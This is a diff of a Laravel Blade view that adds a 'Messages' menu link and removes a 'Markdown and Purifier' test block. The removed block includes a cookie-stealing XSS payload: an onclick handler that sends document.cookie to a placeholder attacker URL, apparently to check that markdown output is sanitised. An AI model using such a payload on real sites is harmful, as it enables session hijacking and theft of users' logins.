@@ -15,17 +15,6 @@
         <li><a href="{{URL::route('login')}}">Login</a></li>
         <li><a href="{{URL::route('logout')}}">Logout</a></li>
         <li><a href="{{URL::route('users.create')}}">Register</a></li>
+        <li><a href="{{URL::route('messages.index')}}">Messages</a></li>
     </ul>
-
-<h2>Markdown and Purifier</h2>
-{{ HTML::markdown('<a href=# onclick=\"document.location=\'http://not-real-xssattackexamples.com/xss.php?c=\'+escape\(document.cookie\)\;\">This is</a> an example of the PHP Typography project.
-
-It was released in 2009, and helps improve web typography.
-
-It "replaces characters" and adds wrapper spans for adjusting the appearance & style of a page.
-
-<dl>
-    <dt>Term</dt>
-    <dd>Definition</dd>
-</dl>') }}
 @stop
